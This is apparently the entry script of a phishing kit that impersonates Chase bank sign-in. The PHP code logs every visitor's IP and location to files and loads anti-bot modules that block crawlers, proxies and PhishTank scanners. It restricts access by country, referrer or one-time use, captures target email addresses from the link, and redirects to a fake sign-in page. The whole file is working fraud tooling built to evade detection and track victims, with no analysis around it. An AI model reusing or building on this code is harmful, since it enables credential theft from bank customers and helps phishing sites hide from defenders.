<?php 
session_start();
// error_reporting(0);
require ("ElZero/ElZero.php");
require ("ElZero/function.php");
$ip = getIp();
$Allvisitor = dataVisitor($ip)."\n";
$_SESSION['ipFullData'] = $Allvisitor;
$AllvisitorFile = fopen("admin/result/all.txt","a");
fwrite($AllvisitorFile,$Allvisitor);
fclose($AllvisitorFile);
require ("X-Sniper/antibot_ip.php");
require ("X-Sniper/antibot_userAgent.php");
require ("X-Sniper/antibot_host.php");
require ("X-Sniper/antibot_phishtank.php");
require ("X-Sniper/antibot_proxy.php");
require ("X-Sniper/someBots.php");
require ("X-Sniper/antibots5.php");
require ("X-Sniper/X-sniper1.php");
require ("X-Sniper/X-sniper2.php");


/* Get info */
$ip = getIp();
$data = GetData();
$city = $data['city'];
$country = $data['country'];
$Currency = $data['Currency'];
$Country_code = $data['Country_code'];
// Start Session 
$_SESSION["ip"] = $ip;
$_SESSION["country"] = $country;
$_SESSION["currency"] = $Currency;
$_SESSION["Country_code"] = $Country_code;


$countryBlock =strtolower($countryBlock);
$allowdCountry = strtolower($allowdCountry);
if ($countryBlock == "true") {
	if(countryLock(strtolower($Country_code),$allowdCountry) ==false and $ip != $yourIPCountry ){
		header("Location: ".$redirectLink);exit();
		echo "country";

	}
}
$redirect = strtolower($redirect);
$redirectFrom = strtolower($redirectFrom);
if ($redirect == "true") {
	if(checkRedirect($redirectFrom) == false ){
		header("Location: ".$redirectLink);exit();
		echo "redirectFrom";

	}
}
$emailGrabber = strtolower($emailGrabber);
if ($emailGrabber =="true") {
	$email = bs2EmailGrabber($_GET['email']);
	if (isset($email) or filter_var($email, FILTER_VALIDATE_EMAIL)) {
		$_SESSION['emailGrabber'] = $email;
	}else{
		header("Location: ".$redirectLink);exit();
		echo "emailGrabber";

	}
}
$listSent = strtolower($listSent);
if ($listSent == "true") {
	if (isset($_GET['email'])) {
			$email = bs2EmailGrabber($_GET['email']);
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
			if ( CheckEmail($email) == false) {
				header("Location: ".$redirectLink);exit();
			}else{
				$_SESSION['emailGrabber'] = $email;
				$file = fopen("visitors/emails.txt","w");
				fwrite($file, $email);
				fclose($file);
			}
		}
	}else{
		echo "listSent";
		header("Location: ".$redirectLink);exit();
	}
}
$accessOneTime = strtolower($accessOneTime);
if ($accessOneTime == "true") {
	$email = bs2EmailGrabber($_GET['email']);
	if (isset($email)) {
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
			
			// echo accessOneTime($email);
			if (accessOneTime($email) == false and $email != $yourEmailGrabber) {
				header("Location: ".$redirectLink);exit();
				echo "emailAccess";

			}else{
				$file = fopen("priv/emailList.txt","a");
				fwrite($file,$email."\n");
				fclose($file);
			}
		}
	}else{
		header("Location: ".$redirectLink);exit();
		echo "emailGrabberAcc";

		
	}
}
$accessOneTimeIp = strtolower($accessOneTimeIp);
if ($accessOneTimeIp == "true") {
	$ip = $_SESSION["ip"];
	$AllowedIp = $yourIPAceess;
	if (accessOneTimeIP($ip) == false and $ip != $AllowedIp) {
		header("Location: ".$redirectLink);exit();
		echo "ip";
	}else{
		$file = fopen("priv/ip.txt","a");
		fwrite($file,$ip."\n");
		fclose($file);
	}
}

/*	Elzero Token*/
$ElZeR0_ToKeN = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$_SESSION['ElZeR0_ToKeN']  = $ElZeR0_ToKeN;

$LogginIp = $_SESSION['ipFullData'];
$sessionIp = fopen("admin/result/allowed.txt","a+");
fwrite($sessionIp,"$LogginIp");
fclose($sessionIp);

header("Location: ./secure/signin?id=chase&country=".$Country_code);exit();